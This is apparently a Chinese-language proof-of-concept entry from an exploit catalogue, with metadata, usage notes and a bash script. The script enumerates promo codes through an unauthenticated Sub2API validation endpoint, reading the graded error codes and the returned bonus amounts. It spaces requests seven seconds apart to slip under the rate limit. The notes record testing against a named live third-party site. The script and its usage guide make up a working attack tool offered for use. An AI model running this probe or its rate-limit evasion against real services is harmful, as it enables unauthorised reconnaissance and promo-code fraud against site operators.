# Sub2API /api/v1/auth/validate-promo-code 未授权优惠码存在性+面额枚举 oracle（error_code 分级回显 + 10 次/分限流可低速绕过）

- **code**: sub2api-validate-promo-code-unauth-enum-oracle
- **kind**: poc
- **category**: info-leak
- **component**: Sub2API (Wei-Shaw/sub2api) auth_handler validate-promo-code
- **severity**: low
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-01 在 https://www.dahurj999.top 实测：① 空 code → 400 且 message 为 "Invalid request: Key: 'ValidatePromoCodeRequest.Code' ... required"（证明 enabled 检查先于 binding 通过、进入 DB 分支）；② 25 个短码猜测全部 200 {"code":0,"data":{"valid":false,"error_code":"PROMO_CODE_NOT_FOUND"}}；③ 25 次按 7s 间隔无一 429，同站对照接口 26 连发第 21 次起 429（20/分桶），证明确实可低速跑更大字典。error_code 分级（DISABLED/EXPIRED/MAX_USED/valid+bonus_amount）由同版本源码 auth_handler.go:498-520 分支确认，本任务尚未拿到 valid:true 的命中样本（码为 16 位随机 hex）。
- **path**: pocs/sub2api-validate-promo-code-unauth-enum-oracle/sub2api_promo_code_oracle.sh
- **tags**: sub2api, promo-code, 优惠码, 枚举, oracle, 未授权, info-leak, error-code, bonus-amount, 限流绕过, 源码对照
- **created_at**: 2026-11-01T08:14:55.931Z
- **engine**: https://www.dahurj999.top

## 描述

未认证的 POST /api/v1/auth/validate-promo-code 按优惠码在库中的状态返回不同 error_code（NOT_FOUND / DISABLED / EXPIRED / MAX_USED / ALREADY_USED），命中时还回显 bonus_amount —— 等于一个「码是否存在 + 面额多少」的 oracle。码由 8 字节随机 hex 生成（16 位），穷举不现实，只对管理员手填的短码/语义码有效；且注册关闭时命中码也无法立即兑换。

## 用法

```
用法：TARGET 换成站点根，字典换成自制短码表。
  bash sub2api_promo_code_oracle.sh codes.txt
判定：
  · 先发空 code：若返回 400 且 message 含 "ValidatePromoCodeRequest.Code" → 功能开关已通过、请求确实落在 DB 查询分支（若返回 PROMO_CODE_DISABLED 则功能关闭，本条不成立）；
  · 逐条猜码：PROMO_CODE_NOT_FOUND = 不存在；DISABLED/EXPIRED/MAX_USED/ALREADY_USED = 码存在但当前不可用；valid:true + data.bonus_amount = 命中且回显面额。
限流：接口标称 10 次/分/IP，实测按 7s 间隔连打 25 次全部 200、无 429（对照 /payment/public/orders/verify 在 26 连发时第 21 次起 429，桶为 20/分），所以字典可以放到 7s/条稳定跑；同 IP 多实例部署时注意各实例桶独立。
失败常见原因：目标关掉了 promo 功能 → 全部返回 DISABLED；码是随机 hex 且字典里没有短码 → 全是 NOT_FOUND 也不算失败，只是没命中；走本机 HTTP 代理时结论可能被代理分流污染，需 --noproxy "*" 复核。
边界：验证通过 ≠ 能兑换，注册关闭（/api/user/register 报 disabled）时命中的码换不出来，只能作情报。
```

## 正文

```
#!/usr/bin/env bash
# Sub2API 优惠码存在性 oracle —— 零凭证，按 error_code 分级判读
# 用法: bash sub2api_promo_code_oracle.sh codes.txt
# 限速: 7s/条（标称 10/分，实测 25 连发不触发 429）

TARGET="${TARGET:-https://www.dahurj999.top}"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36"
DICT="${1:-codes.txt}"
CURL="curl -sS -k --noproxy * -A ${UA:Q} -m 10"

post() {  # $1 = code (may be empty)
  $CURL -D /tmp/_h -X POST "$TARGET/api/v1/auth/validate-promo-code" \
        -H 'Content-Type: application/json' \
        --data-binary "$(printf '{"code":"%s"}' "$1")"
  echo "  [http] $(head -1 /tmp/_h | tr -d '\r')"
}

echo "=== [0] 功能开关探针（空 code）==="
post ""
# 400 + Field validation for 'Code' failed on the 'required' tag
#   => enabled 检查在 binding 之前通过，请求已进 DB 查询分支
# DISABLED 类返回 => 功能关闭，本条不成立

echo "=== [1] 逐条判读（7s 间隔）==="
while IFS= read -r c; do
  [ -z "$c" ] && continue
  echo "--- code=$c"
  post "$c"
  sleep 7
done < "$DICT"

# ---------------------------------------------------------------
# 判读表（源码分支 auth_handler.go:498-520）：
#   PROMO_CODE_NOT_FOUND  码不存在
#   PROMO_CODE_DISABLED   码存在但被停用
#   PROMO_CODE_EXPIRED    码存在但过期
#   PROMO_CODE_MAX_USED   码存在但达使用上限
#   PROMO_CODE_ALREADY_USED 该码已被当前用户用过（需登录态）
#   valid:true + data.bonus_amount  命中，直接回显面额
#
# 码空间：8 字节随机 hex（16 位，16^16）=> 穷举不可行，
# 只打管理员自定义短码/语义码（WELCOME / 品牌名 / 年份 / 活动名）。
#
# 证据留存格式（实测）：
#   POST /api/v1/auth/validate-promo-code {"code":""}
#   -> 400 {"code":400,"message":"Invalid request: Key: 'ValidatePromoCodeRequest.Code' ..."}
#   25 个猜测全部 200 {"code":0,"message":"success","data":{"valid":false,"error_code":"PROMO_CODE_NOT_FOUND"}}
# ---------------------------------------------------------------

```
